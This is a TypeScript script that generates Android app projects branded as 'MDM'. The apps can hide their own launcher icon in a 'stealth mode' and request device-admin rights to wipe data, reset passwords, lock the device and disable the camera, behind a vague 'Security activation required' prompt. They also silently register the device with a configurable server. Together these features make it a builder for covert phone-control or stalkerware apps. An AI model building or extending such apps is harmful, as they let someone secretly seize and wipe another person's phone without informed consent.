import { promises as fs } from "fs";
import path from "path";

export interface APKConfig {
  appName: string;
  packageName: string;
  versionName: string;
  versionCode: number;
  stealthMode: boolean;
  sslEnabled: boolean;
  ports: number[];
  serverUrl: string;
  iconUrl?: string;
}

// Ensure environment variables are present
const configBase64 = process.env.APK_CONFIG_BASE64;
if (!configBase64) {
  console.error("Error: Missing APK_CONFIG_BASE64 environment variable.");
  process.exit(1);
}
const buildId = process.env.BUILD_ID || "test-build";

const config: APKConfig = JSON.parse(Buffer.from(configBase64, 'base64').toString('utf-8'));

const buildDir = path.join(process.cwd(), "builds");
const projectDir = path.join(buildDir, buildId);

async function generateFiles() {
  try {
    const dirs = [
      "app/src/main",
      "app/src/main/java",
      "app/src/main/res/values",
      "app/src/main/res/xml",
      "app/src/main/res/drawable",
      "gradle/wrapper",
    ];

    for (const dir of dirs) {
      await fs.mkdir(path.join(projectDir, dir), { recursive: true });
    }

    // Simple app/build.gradle
    const buildGradle = `plugins {
    id 'com.android.application' version '8.2.2'
}

android {
    namespace '${config.packageName}'
    compileSdk 34

    defaultConfig {
        applicationId '${config.packageName}'
        minSdk 21
        targetSdk 34
        versionCode ${config.versionCode}
        versionName '${config.versionName}'
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_11
        targetCompatibility JavaVersion.VERSION_11
    }
}

repositories {
    google()
    mavenCentral()
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
}`;
    await fs.writeFile(path.join(projectDir, "app/build.gradle"), buildGradle);

    // Simple root build.gradle
    await fs.writeFile(path.join(projectDir, "build.gradle"), "// Top-level build file");

    // settings.gradle with plugin management for Gradle 8.2+
    const settingsGradle = `pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}
rootProject.name = "APKBuilder"
include ':app'`;
    await fs.writeFile(path.join(projectDir, "settings.gradle"), settingsGradle);

    const manifest = `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="${config.packageName}">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    
    <!-- Permisos para MDM -->
    <uses-permission android:name="android.permission.MANAGE_DEVICE_ADMINS" />
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
        android:usesCleartextTraffic="${!config.sslEnabled}">

        <!-- Actividad Principal -->
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Receptor de Administrador de Dispositivo (MDM Core) -->
        <receiver
            android:name=".AdminReceiver"
            android:exported="true"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
                <action android:name="android.app.action.PROFILE_PROVISIONING_COMPLETE"/>
            </intent-filter>
        </receiver>

    </application>

</manifest>`;
    await fs.writeFile(path.join(projectDir, "app/src/main/AndroidManifest.xml"), manifest);

    const strings = `<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">${config.appName}</string>
    <string name="server_url">${config.serverUrl}</string>
    <string name="server_ports">${config.ports.join(",")}</string>
    <string name="stealth_mode">${config.stealthMode}</string>
</resources>`;
    await fs.writeFile(path.join(projectDir, "app/src/main/res/values/strings.xml"), strings);

    const deviceAdminXml = `<?xml version="1.0" encoding="utf-8"?>
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <limit-password />
        <watch-login />
        <reset-password />
        <force-lock />
        <wipe-data />
        <expire-password />
        <encrypted-storage />
        <disable-camera />
    </uses-policies>
</device-admin>`;
    await fs.writeFile(path.join(projectDir, "app/src/main/res/xml/device_admin.xml"), deviceAdminXml);

    const packagePath = config.packageName.replace(/\./g, "/");
    await fs.mkdir(path.join(projectDir, `app/src/main/java/${packagePath}`), { recursive: true });

    const mainActivity = `package ${config.packageName};

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
    
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);
        
        TextView textView = new TextView(this);
        textView.setText("${config.appName} - MDM Initializing...");
        setContentView(textView);

        // Registro inicial con el servidor
        registerDevice();

        // Modo Oculto
        if ("true".equals("${config.stealthMode}")) {
            hideAppIcon();
        }

        // Solicitar permisos de administrador si no se tienen
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Security activation required.");
            startActivityForResult(intent, 1);
        } else {
            Toast.makeText(this, "Device Enrolled", Toast.LENGTH_SHORT).show();
        }
    }

    private void hideAppIcon() {
        android.content.pm.PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, 
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
            android.content.pm.PackageManager.DONT_KILL_APP);
    }

    private void registerDevice() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String serverUrl = "${config.serverUrl}";
                    java.net.URL url = new java.net.URL(serverUrl + "/api/devices/register");
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/json");
                    String json = "{\\\"name\\\":\\\"\" + android.os.Build.MODEL + \"\\\", \\\"brand\\\":\\\"\" + android.os.Build.BRAND + \"\\\"}";
                    byte[] input = json.getBytes("utf-8");
                    conn.getOutputStream().write(input, 0, input.length);
                    conn.getResponseCode();
                } catch (Exception e) {}
            }
        }).start();
    }
}`;
    await fs.writeFile(
      path.join(projectDir, `app/src/main/java/${packagePath}/MainActivity.java`),
      mainActivity
    );

    const adminReceiver = `package ${config.packageName};

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class AdminReceiver extends DeviceAdminReceiver {
    
    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        Toast.makeText(context, "Administración de Dispositivo Habilitada", Toast.LENGTH_SHORT).show();
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "Deshabilitar esto eliminará el acceso a los recursos corporativos.";
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        Toast.makeText(context, "Administración de Dispositivo Deshabilitada", Toast.LENGTH_SHORT).show();
    }
}`;
    await fs.writeFile(
      path.join(projectDir, `app/src/main/java/${packagePath}/AdminReceiver.java`),
      adminReceiver
    );

    console.log(`Project files successfully generated in ${projectDir}`);
  } catch (error) {
    console.error("Error generating files:", error);
    process.exit(1);
  }
}

generateFiles();
